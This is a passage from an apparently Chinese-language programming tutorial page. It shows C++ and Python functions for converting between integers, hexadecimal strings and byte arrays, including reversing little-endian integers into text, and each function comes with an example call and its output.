punctuation">&#125;</span>std<span class="token double-colon punctuation">::</span>string s <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> s_temp<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> width<span class="token punctuation">,</span> s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 取右width位</span><span class="token keyword">return</span> s<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>输入信息：int 型 <code>num = 1125</code>，位数 <code>width = 6</code></p><p>调用：<code>int_to_string(1125, 6)</code></p><p>输出结果：<code>0x000465</code></p></blockquote><hr><h2 id="C-递归版"><a href="#C-递归版" class="headerlink" title="C++ 递归版"></a>C++ 递归版</h2><ul><li><p><strong>特点</strong></p><ol><li>开头不包含 <code>&#39;0x&#39;</code></li><li>不要求输出的长度都相同</li><li>结果以字符数组形式输出</li></ol></li><li><p><strong>代码</strong></p></li></ul><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><code>num</code></td><td align="left">待转换的 int 型数据</td></tr><tr><td align="left"><code>buffer</code></td><td align="left">用来存储转换为 string 型结果的字符数组</td></tr></tbody></table><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">int_to_string</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>      <span class="token keyword">static</span> <span class="token keyword">int</span>  this_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      this_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span>            <span class="token comment">//递归结束条件  </span>    <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span>        <span class="token comment">//当前数转换成字符放入字符串  </span>            buffer<span class="token punctuation">[</span>this_index<span class="token punctuation">]</span> <span class="token operator">=</span> num <span class="token operator">+</span> <span class="token char">'0'</span><span class="token punctuation">;</span>          <span class="token keyword">else</span>            buffer<span class="token punctuation">[</span>this_index<span class="token punctuation">]</span> <span class="token operator">=</span> num <span class="token operator">-</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token char">'a'</span><span class="token punctuation">;</span>          buffer<span class="token punctuation">[</span>this_index<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span> <span class="token comment">//字符串结束标志  </span>    <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>          <span class="token function">int_to_string</span><span class="token punctuation">(</span>num <span class="token operator">/</span> <span class="token number">16</span><span class="token punctuation">,</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//递归调用  </span>        this_index<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token comment">//字符串索引+1  </span>        num <span class="token operator">%=</span> <span class="token number">16</span><span class="token punctuation">;</span>           <span class="token comment">//计算当前值  </span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span>        <span class="token comment">//当前数转换成字符放入字符串  </span>            buffer<span class="token punctuation">[</span>this_index<span class="token punctuation">]</span> <span class="token operator">=</span> num <span class="token operator">+</span> <span class="token char">'0'</span><span class="token punctuation">;</span>          <span class="token keyword">else</span>            buffer<span class="token punctuation">[</span>this_index<span class="token punctuation">]</span> <span class="token operator">=</span> num <span class="token operator">-</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token char">'a'</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> buffer<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>输入信息：int 型 <code>num = 1125</code>，字符数组 <code>buffer[10] = &#123;0&#125;</code></p><p>调用：<code>int_to_string(1125, buffer)</code></p><p>输出信息：<code>465</code></p></blockquote><hr><h2 id="Python-版"><a href="#Python-版" class="headerlink" title="Python 版"></a>Python 版</h2><ul><li><p><strong>特点</strong></p><ol><li>以 <code>&#39;0x&#39;</code> 开头</li><li>转换后的字符串输出时可以保证长度都相同</li><li>结果以字符串形式输出</li></ol></li><li><p><strong>参数</strong></p></li></ul><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><code>num</code></td><td align="left">待转换的 int 型数据</td></tr><tr><td align="left"><code>width</code></td><td align="left">指定转换后得到的十六进制 string 型的长度，不包括 <code>&#39;0x&#39;</code>，位数不够的话高位补 0</td></tr></tbody></table><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">int_to_string</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> width<span class="token punctuation">)</span><span class="token punctuation">:</span>      s <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>  <span class="token comment"># 将num转换为十六进制字符串（含0x）  </span>    length <span class="token operator">=</span> width <span class="token operator">+</span> <span class="token number">2</span>  <span class="token comment"># 要求的长度加上0x后的长度  </span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">&lt;</span> length<span class="token punctuation">:</span>  <span class="token comment"># 如果位数不合要求  </span>        s <span class="token operator">=</span> <span class="token string">'0x'</span> <span class="token operator">+</span> <span class="token string">'0'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>length <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># 高位补0  </span>    <span class="token keyword">return</span> s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>输入信息：int 型 <code>num = 1125</code>，位数 <code>width = 6</code></p><p>调用：<code>int_to_string(1125, 6)</code></p><p>输出结果：<code>0x000465</code></p></blockquote><hr><h1 id="十六进制-string-型-gt-int-型"><a href="#十六进制-string-型-gt-int-型" class="headerlink" title="十六进制 string 型 -&gt; int 型"></a>十六进制 string 型 -&gt; int 型</h1><h2 id="C-版"><a href="#C-版" class="headerlink" title="C++ 版"></a>C++ 版</h2><ul><li><p><strong>特点</strong></p><ol><li>将十六进制的 string 型数据转换为 int 型</li><li>也可以从某个长的 string 型数据中截取某一段短的 string 型字符串转换为 int 型</li></ol></li><li><p><strong>参数</strong></p></li></ul><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><code>s</code></td><td align="left">十六进制数的 string 型字符串</td></tr><tr><td align="left"><code>index</code></td><td align="left">从下标为 <code>index</code> 的位置开始处理（包括 <code>&#39;0x&#39;</code> 的长度）</td></tr><tr><td align="left"><code>length</code></td><td align="left">将从 <code>index</code> 开始，长度为 <code>length</code> 的字符串转换为 int 型</td></tr></tbody></table><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span>  </span>  <span class="token keyword">int</span> <span class="token function">string_to_int</span><span class="token punctuation">(</span>string s<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> tmp<span class="token punctuation">[</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 存放十六进制的每一位字符转换后对应的十进制数  </span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">102</span><span class="token punctuation">)</span>  <span class="token comment">// 处理a-f  </span>            tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token punctuation">;</span>          <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">70</span><span class="token punctuation">)</span>   <span class="token comment">// 处理A-F  </span>            tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">64</span><span class="token punctuation">;</span>          <span class="token keyword">else</span>    <span class="token comment">// 处理0-9  </span>            tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>          sum <span class="token operator">=</span> sum <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> length<span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>          index<span class="token operator">++</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> sum<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>输入信息：字符串 <code>s = &quot;0x7D2E370A180F1604&quot;</code>，索引 <code>index = 2</code>，长度 <code>length = 2</code></p><p>调用：<code>string_to_int(s, 2, 2)</code></p><p>输出结果：<code>125</code>（由 0x7D 得来）</p></blockquote><hr><h2 id="Python-版-1"><a href="#Python-版-1" class="headerlink" title="Python 版"></a>Python 版</h2><ul><li><p><strong>特点</strong></p><ol><li>将 string 类型 的十六进制数 <code>s</code>，从下标 <code>index</code> 的位置开始（包括 <code>&#39;0x&#39;</code>），长度为 <code>length</code> 的部分，转换为十进制数 <code>sum</code></li></ol></li><li><p><strong>参数</strong></p></li></ul><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><code>s</code></td><td align="left">十六进制数的 string 型字符串</td></tr><tr><td align="left"><code>index</code></td><td align="left">从下标为 <code>index</code> 的位置开始处理（包括 <code>&#39;0x&#39;</code> 的长度）</td></tr><tr><td align="left"><code>length</code></td><td align="left">将从 <code>index</code> 开始，长度为 <code>length</code> 的字符串转换为 int 型</td></tr></tbody></table><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">string_to_int</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> index<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>      num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">:</span> index <span class="token operator">+</span> length<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> num<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>输入信息：字符串 <code>s = &quot;0x7D2E370A180F1604&quot;</code>，索引 <code>index = 2</code>，长度 <code>length = 3</code></p><p>调用：<code>string_to_int(s, 2, 3)</code></p><p>输出结果：<code>2002</code>（由 0x7D2 得来）</p></blockquote><hr><h1 id="十六进制-string-型-gt-int-amp-char-型数组"><a href="#十六进制-string-型-gt-int-amp-char-型数组" class="headerlink" title="十六进制 string 型 -&gt; int &amp; char 型数组"></a>十六进制 string 型 -&gt; int &amp; char 型数组</h1><h2 id="C-版-1"><a href="#C-版-1" class="headerlink" title="C++ 版"></a>C++ 版</h2><ul><li><p><strong>特点</strong></p><ol><li>将十六进制的 string 型数据转换为 int &amp; char 型数组</li><li>也可以从某个长的 string 型数据中截取某一段短的 string 型字符串转换为 int &amp; char 型数组</li><li>将 <code>num</code> 对应的 int 改为 char 即可得到 char 型数组</li></ol></li><li><p><strong>参数</strong></p></li></ul><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><code>s</code></td><td align="left">十六进制数的 string 型字符串</td></tr><tr><td align="left"><code>index</code></td><td align="left">从下标为 <code>index</code> 的位置开始处理（包括 <code>&#39;0x&#39;</code> 的长度）</td></tr><tr><td align="left"><code>length</code></td><td align="left">将从 <code>index</code> 开始，长度为 <code>length</code> 的字符串转换为 int &amp; char 型数组</td></tr><tr><td align="left"><code>num</code></td><td align="left">用来存储转换为 int &amp; char 型结果的数组</td></tr></tbody></table><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"> <span class="token keyword">void</span> <span class="token function">string_to_array</span><span class="token punctuation">(</span>string s<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> length<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>num<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">/</span> length<span class="token punctuation">;</span> <span class="token operator">++</span>k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token keyword">int</span> tmp<span class="token punctuation">[</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 存放十六进制的每一位字符转换后对应的十进制数  </span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>              <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">102</span><span class="token punctuation">)</span>  <span class="token comment">// 处理sum-f  </span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token punctuation">;</span>              <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">70</span><span class="token punctuation">)</span>   <span class="token comment">// 处理sum-F  </span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">64</span><span class="token punctuation">;</span>              <span class="token keyword">else</span>    <span class="token comment">// 处理0-9  </span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>              sum <span class="token operator">=</span> sum <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> length<span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>              index<span class="token operator">++</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          num<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> sum<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>输入信息：字符串 <code>s = &quot;0x7D2E370A180F1604&quot;</code>，索引 <code>index = 2</code>，长度 <code>length = 2</code>，int 型数组 <code>num[10] = &#123;0&#125;</code></p><p>调用：<code>string_to_array(s, 2, 2, num)</code></p><p>输出结果：<code>[125, 46, 55, 10, 24, 15, 22, 4, 0, 0]</code>（由 0x7D, 0x2E, 0x37, 0x0A, 0x18, 0x0F, 0x16, 0x04 得来）</p></blockquote><hr><h2 id="Python-版-2"><a href="#Python-版-2" class="headerlink" title="Python 版"></a>Python 版</h2><ul><li><p><strong>特点</strong></p><ol><li>将任意长度的 string 型数据转换为列表 list 形式</li><li>也可以从某个长的 string 型数据中截取某一段短的 string 型字符串转换为列表 list 形式</li></ol></li><li><p><strong>参数</strong></p></li></ul><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><code>s</code></td><td align="left">十六进制数的 string 型字符串</td></tr><tr><td align="left"><code>index</code></td><td align="left">从下标为 <code>index</code> 的位置开始处理（包括 <code>&#39;0x&#39;</code> 的长度）</td></tr><tr><td align="left"><code>length</code></td><td align="left">将从 <code>index</code> 开始，长度为 <code>length</code> 的字符串转换为 list 列表</td></tr></tbody></table><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">string_to_array</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> index<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>          num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">:</span> i <span class="token operator">+</span> length<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 将字符串按照步长，逐个转换为对应的十六进制数  </span>        <span class="token builtin">buffer</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token builtin">buffer</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>输入信息：字符串 <code>s = &quot;0x7D2E370A180F1604&quot;</code>，索引 <code>index = 2</code>，长度 <code>length = 3</code></p><p>调用：<code>string_to_array(s, 2, 3)</code></p><p>输出结果：<code>[&#39;0x7d2&#39;, &#39;0xe37&#39;, &#39;0xa1&#39;, &#39;0x80f&#39;, &#39;0x160&#39;, &#39;0x4&#39;]</code></p></blockquote><hr><h1 id="小端序-int-型-gt-逆向-string-型字符串"><a href="#小端序-int-型-gt-逆向-string-型字符串" class="headerlink" title="小端序 int 型 -&gt; 逆向 string 型字符串"></a>小端序 int 型 -&gt; 逆向 string 型字符串</h1><h2 id="C-版-2"><a href="#C-版-2" class="headerlink" title="C++ 版"></a>C++ 版</h2><ul><li><p><strong>特点</strong></p><ol><li><strong>将小端序存放的 int型 数据转换为正序</strong>，并将结果存放到 string 字符串 buffer 中</li><li><mark>若 num 位数超长，将类型改为 <em>__int64</em></mark></li></ol></li><li><p><strong>参数</strong></p></li></ul><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td><code>num</code></td><td>小端序存放的 <code>int</code> 型数</td></tr><tr><td><code>width_num</code></td><td>小端序存放的 <code>int</code> 型数据对应的 十六进制数 除去 <code>&#39;0x&#39;</code> 后的长度</td></tr><tr><td><code>buffer_length</code></td><td>字符串 <code>buffer</code> 的长度，可根据 <code>width_num / 2</code> 得出</td></tr></tbody></table><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sstream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span>std<span class="token double-colon punctuation">::</span>string <span class="token function">little_endian</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">int</span> width_num<span class="token punctuation">,</span> <span class="token keyword">int</span> buffer_length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>stringstream ioss<span class="token punctuation">;</span>     <span class="token comment">// 定义字符串流</span>    std<span class="token double-colon punctuation">::</span>string s_temp<span class="token punctuation">;</span>         <span class="token comment">// 存放转化后字符</span>    ioss <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>hex <span class="token operator">&lt;&lt;</span> num<span class="token punctuation">;</span>      <span class="token comment">// 以十六制形式输出</span>    ioss <span class="token operator">>></span> s_temp<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>width_num <span class="token operator">></span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>string <span class="token function">s_0</span><span class="token punctuation">(</span>width_num <span class="token operator">-</span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 位数不够则补0</span>        s_temp <span class="token operator">=</span> s_0 <span class="token operator">+</span> s_temp<span class="token punctuation">;</span>                            <span class="token comment">// 合并</span>    <span class="token punctuation">&#125;</span>    std<span class="token double-colon punctuation">::</span>string s <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> s_temp<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> width_num<span class="token punctuation">,</span> s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 取右width位</span>    std<span class="token double-colon punctuation">::</span>string buffer <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> index <span class="token operator">=</span> width_num<span class="token punctuation">;</span> index <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">;</span> index <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">char</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> tmp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 存放十六进制的每一位字符转换后对应的十进制数</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 将2长度的字符串转换为十进制数，存放到sum</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">102</span><span class="token punctuation">)</span>  <span class="token comment">// 处理a-f</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">70</span><span class="token punctuation">)</span>   <span class="token comment">// 处理A-F</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">64</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>    <span class="token comment">// 处理0-9</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>            sum <span class="token operator">=</span> sum <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            index<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        index <span class="token operator">=</span> index <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>   <span class="token comment">// 因为前面修改了index，后面还要用index控制循环，所以这里将其还原</span>        buffer <span class="token operator">+=</span> sum<span class="token punctuation">;</span>  <span class="token comment">// 将字符sum逆向存储到 buffer字符串</span>        buffer_length<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> buffer<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>输入信息：int 型 <code>num = 0x65766F6C</code>，num 长度 <code>width_num = 8</code>，buffer 长度 <code>buffer_length = 4</code></p><p>调用：<code>little_endian(num, 8, 4)</code></p><p>输出结果：<code>love</code>（由 0x6C, 0x6F, 0x76, 0x65 得来）</p></blockquote><hr><h2 id="Python-版-3"><a href="#Python-版-3" class="headerlink" title="Python 版"></a>Python 版</h2><ul><li><p><strong>特点</strong></p><ol><li><strong>将小端序存放的 int型 